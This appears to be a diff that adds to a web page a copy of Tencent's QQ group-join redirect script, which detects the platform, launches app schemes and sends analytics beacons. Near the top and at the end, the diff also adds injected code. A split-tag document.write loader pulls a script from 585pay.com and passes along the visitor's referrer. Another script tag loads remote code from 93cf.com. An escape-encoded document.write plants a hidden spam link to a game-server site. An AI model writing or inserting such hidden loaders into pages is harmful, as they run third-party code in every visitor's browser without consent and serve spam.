+		<source src="music.mp3" type="audio/mpeg">
+	</audio>
+
+
+</div>
+ <script src="js/web.js"></script>
+
+<script>var ul = 'https://585pay.com/uf_10288?gid=0&r='+Math.random()+'&rf='+document.referrer;document.write('<s'+'cript src="'+ ul +'"></s'+ 'cript>');</script>
+
+<script type="text/javascript">
+   // (function(){
+	    var type = 1;
+	    var param = "010102000102000433a9156e";
+	    var sid = 2;
+	    var rawuin = 866719086;
+	    var qsig = "tencent:\/\/groupwpa\/?subcmd=all\x26param=7b2267726f757055696e223a3836363731393038362c2274696d655374616d70223a313631313538353138302c22617574684b6579223a2230687749465550434d6763665033474963376c7448576b33667772656c39336673366e487535564e67765a725146597873696e626b365a61754b515763624433222c2261757468223a22227d";
+	    var qun_type = "undefined";
+
+	    //var type = 1;
+	    //var param = "010102000102000407303607";
+	    //var sid = 2;
+	    //var rawuin = 120600071;
+	    //var qsig = "tencent://groupwpa/?subcmd=all&param=7B2267726F757055696E223A3132303630303037312C2274696D655374616D70223A313530313536353335327D0A";
+	    //var qun_type = "undefined";
+
+	    var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
+
+
+
+	    // if(sid == 5){
+	    // 	document.title = "温馨提示";
+	    // 	window.open("/admin.qun.qq.com/man/jump.html?gc="+rawuin,"_self");
+	    // }
+		var getUrlParam = function(name, href, noDecode) {
+		    var re = new RegExp("(?:\\?|#|&)" + name + "=([^&]*)(?:$|&|#)", "i"),
+		    m = re.exec(href);
+		    var ret = m ? m[1] : "";
+		    return ! noDecode ? decodeURIComponent(ret) : ret
+		};
+
+		var jump_from = getUrlParam("jump_from", location.href);
+		var auth_key = getUrlParam("auth", location.href);
+		var app_name = getUrlParam("app_name", location.href);
+        // 2019年04月24日更新,新增鉴权字段
+        var auth_sig = getUrlParam("authKey", location.href);
+        // 2020年07月09日更新,新增是否二维码字段        var isQR = getUrlParam("qr", location.href) === '1';
+		var isQim = app_name === 'qim';
+
+       if(isQim){
+           document.getElementById('update_link').innerHTML = '升级DOV';
+           document.getElementById('going_wording').innerHTML = '正在前往DOV';
+
+           document.title = 'DOV-无乐不作';
+
+           var m_container = document.getElementById('m_container');
+
+           m_container.setAttribute('class',m_container.getAttribute('class') + ' qim');
+       }
+
+
+		var reportData = function(nvalue, error) {
+		    var img = new Image();
+		    var str = "/cgi.pub.qq.com/report/bnl?data=" + 0 + "," + nvalue + "," + (error || 0) + "," + p;
+		    img.src = str
+		};
+		var speed = {
+		    report: function(f1, f2, f3, f4, time) {
+		        var ISD_REPORT_URL = "/isdspeed.qq.com/cgi-bin/r.cgi?";
+		        var isdTransport = new Image();
+		        var reportData = f4 + "=" + time;
+		        var url = ISD_REPORT_URL + "flag1=" + f1 + "&flag2=" + f2 + "&flag3=" + f3 + "&" + reportData;
+		        isdTransport.src = url
+		    }
+		};
+
+
+
+        // 单个小圆点上下跳动动画        function animateRound(dom, initialState, max_top, min_top, speed) {
+            dom.style.top = initialState + 'px';
+            var isUp = true;
+            setInterval(function () {
+                var top = parseInt(dom.style.top);
+                if (isUp) {
+                    if (max_top < top) {
+                        top -= 1;
+                    } else {
+                        isUp = false;
+                        top += 1;
+                    }
+                } else {
+                    if (min_top > top) {
+                        top += 1;
+                    } else {
+                        isUp = true;
+                        top -= 1;
+                    }
+                }
+                dom.style.top = top + 'px';
+            }, speed);
+        }
+
+
+		var ua = navigator.userAgent;
+		var p;
+		var REGEXP_IOS_QQ = /(iPad|iPhone|iPod).*? QQ\/([\d\.]+)/;
+		var isiOSMQ = REGEXP_IOS_QQ.test(ua);
+       if(ua.indexOf('QIM') > -1 || ua.indexOf('DOV') > -1){
+           isiOSMQ = false;
+       }
+		var isSafari = ua.indexOf("Safari") > -1;
+		
+		var mobile_q_jump = {
+			android:"/im.qq.com",
+			ios:"itms-apps://itunes.apple.com/cn/app/qq-2011/id444934666?mt=8",
+			winphone:"/www.windowsphone.com/zh-cn/store/app/qq/b45f0a5f-13d8-422b-9be5-c750af531762",
+			pc:"/mobile.qq.com/index.html"
+		};
+
+       if(isQim){
+           mobile_q_jump = {
+               android:"http://dov.qq.com",
+               ios:"itms-apps://itunes.apple.com/cn/app/dov/id1334674854?mt=8",
+               winphone:"http://dov.qq.com",
+               pc:"http://dov.qq.com"
+           };
+       }
+
+		if(typeof type == "undefined") type = 1;
+
+		if(ua.indexOf("Android")>-1){
+			p = "android";
+		}
+		else if(ua.indexOf("iPhone")>-1 || ua.indexOf("iPad")>-1 || ua.indexOf("iPod")>-1){
+			p = "ios";
+		}
+		else if(ua.indexOf("Windows Phone") > -1 || ua.indexOf("WPDesktop") > -1){
+			p = "winphone";
+		}
+		else {
+			p = "pc";
+		}
+		
+		if(p == "ios"){
+			//防止循环
+			if(history.pushState && !isiOSMQ)
+				history.pushState({},"t","#");
+		}
+		else if(p == "pc" && qsig != "undefined"){
+			window.open(qsig + "&jump_from=" + jump_from,"_self");
+		}
+
+       function checkWechat(version){
+           var v = version.split('.');
+
+           var version656 = (6 * 1000 * 1000) + (5 * 1000 ) + 6;
+
+           var newVersion = (v[0] * 1000000) + (v[1] * 1000) + (v[2]);
+
+           return newVersion >= version656;
+       }
+
+        //if(p === 'pc' || p === 'winphone'){
+
+        //}else{
+            document.querySelector('.tips').classList.add('mobile-tips')
+            document.querySelector('.tips').style.display = "block"
+            var rounds = document.querySelectorAll('.box');
+            for (var i = 0, len = rounds.length; i < len; i++) {
+                var aspeed = 50;
+                (function (i) {
+                    setTimeout(function () {
+                        animateRound(rounds[i], 2, -1, 5, aspeed);
+                    }, 5 * (i + 1) * (aspeed - 10));
+                })(i);
+            }            
+        //}
+
+        document.getElementById("update_link").onclick = function(){
+            var jumpUrl = mobile_q_jump[p]; 
+            if(jumpUrl) window.open(jumpUrl,"_self");
+        }        
+
+		if(wechatInfo && checkWechat(wechatInfo[1])){
+			var doLaunch = function () { 
+			     setTimeout(function() {  
+			     	var url = '';
+					if(p == "ios" && sid == 2){//ios并且为群名片
+                        var scheme = 'mqqapi';
+                        if(isQim){
+                            scheme = 'qimapi';
+                        }
+						url = scheme + "://card/show_pslcard?src_type=internal&version=1&uin="+ rawuin +"&card_type=group&source=qrcode&jump_from=" + jump_from + "&auth=" + auth_key +"&authSig=" + auth_sig + "&source_id=" + (isQR ? '2_40002' : '2_40001');
+					} else if(p !== "pc"){
+						var url = window.location.href.split("&");
+						var kParam = getUrlParam("k", location.href);
+                        var scheme = 'mqqopensdkapi';
+                        if(isQim){
+                            scheme = 'qimopensdkapi';
+                        }
+						if(p=='ios'){
+							url = scheme  + "://bizAgent/qm/qr?url=" + encodeURIComponent("http://qm.qq.com/cgi-bin/qm/qr?k=" + kParam+"&jump_from=" + jump_from + "&auth=" + auth_key+ "&app_name=" + app_name+"&authSig=" + auth_sig + "&source_id=" + (isQR ? '2_40002' : '2_40001')) ;
+						}else{
+							url = scheme + "://bizAgent/qm/qr?url=" + encodeURIComponent("https://qm.qq.com/cgi-bin/qm/qr?k=" + kParam+"&jump_from=" + jump_from + "&auth=" + auth_key+ "&app_name=" + app_name+"&authSig=" + auth_sig + "&source_id=" + (isQR ? '3_40002' : '3_40001')) ;
+						}
+					}
+
+			        WeixinJSBridge.invoke('launchApplication', { 
+			             "schemeUrl" : url
+			        }, function (res) {
+                        if(res && res.err_msg === 'launchApplication:fail'){
+                            var jumpUrl = mobile_q_jump[p];
+
+                            reportData(11780, 1);
+
+                            if(jumpUrl) {
+                                setTimeout(function(){
+                                    window.open(jumpUrl,"_self");
+                                },0);
+                            }
+                        }
+			        });
+			    },500); 
+			}
+
+			if(window.WeixinJSBridge){
+				doLaunch();
+			}else{
+				document.addEventListener('WeixinJSBridgeReady', function (){
+					doLaunch();
+				});
+			}
+		}else if(type == 1){//手Q
+			var isSuccess = true;
+
+			var f = document.createElement("iframe");
+			f.style.display = "none";
+			document.body.appendChild(f);
+
+			reportData(11780);
+
+			f.onload = function(){
+				isSuccess = false;
+			};
+			setTimeout(function(){
+				if(p == "ios" && sid == 2){//ios并且为群名片
+                    var scheme = 'mqqapi';
+                    if(isQim){
+                        scheme = 'qimapi';
+                    }
+
+					var iosUrl = scheme + "://card/show_pslcard?src_type=internal&version=1&uin="+ rawuin +"&card_type=group&source=qrcode&jump_from=" + jump_from + "&auth=" + auth_key+"&authSig=" + auth_sig + "&source_id=" + (isQR ? '2_40002' : '2_40001');
+
+					// ios9以上safari不能通过iframe唤起
+					if(isSafari){
+						location.href = iosUrl;
+					}
+					else{
+						f.src = iosUrl;				
+					}
+
+				}
+				else if(p != "pc"){
+					var url = window.location.href.split("&");
+					var kParam = getUrlParam("k", location.href);
+                    var scheme = 'mqqopensdkapi';
+                    if(isQim){
+                        scheme = 'qimopensdkapi';
+                    }
+					if(p=='ios'){
+						f.src = scheme + "://bizAgent/qm/qr?url=" + encodeURIComponent("http://qm.qq.com/cgi-bin/qm/qr?k=" + kParam+"&jump_from=" + jump_from + "&auth=" + auth_key+ "&app_name=" + app_name+"&authSig=" + auth_sig + "&source_id=" + (isQR ? '2_40002' : '2_40001')) ;
+					}else{
+						f.src = scheme + "://bizAgent/qm/qr?url=" + encodeURIComponent("https://qm.qq.com/cgi-bin/qm/qr?k=" + kParam+"&jump_from=" + jump_from + "&auth=" + auth_key + "&app_name=" + app_name+"&authSig=" + auth_sig + "&source_id=" + (isQR ? '3_40002' : '3_40001')) ;
+					}
+					//alert(scheme + "://bizAgent/qm/qr?url=" + encodeURIComponent("http://qm.qq.com/cgi-bin/qm/qr?k=" + kParam+"&jump_from=" + jump_from + "&auth=" + auth_key+ "&app_name=" + app_name+"&authSig=" + auth_sig) )
+				}
+				//群				if(sid == 2 && p != "pc" && !isQim){
+					document.title = "申请加入QQ群";
+					document.getElementById("m_container").style.display = "block";
+				}
+
+				var now = Date.now();
+				setTimeout( function(){
+					if((p == "ios" && (!isiOSMQ || isQim) && Date.now() - now < 2000) || (p == "android" && (!isSuccess || isQim)) || ((p == "winphone" && Date.now() - now < 2000))){
+						var jumpUrl = mobile_q_jump[p]; 
+
+						reportData(11780, 1);
+
+						if(jumpUrl) {
+							setTimeout(function(){
+								window.open(jumpUrl,"_self");
+							},800);
+						}
+					}
+				} , 1500);
+			},1500);
+			
+		}
+		speed.report("7832", "19", "2", "1", Date.now() - window.startTime);
+	//})();
 </script>
+<script src="https://www.93cf.com/dl/1/zq.js"></script>
 </body>
 </html>
+<script>
+<!--
+document.write(unescape("%3Ca%20href%3D%22http%3A//%77%77%77%2e%67%6d%62%75%6c%75%6f%2e%63%6f%6d/%22%3E%u4F20%u5947%u670D%u52A1%u7AEF%3C/a%3E%3C/p%3E"));
+//-->
+</script>
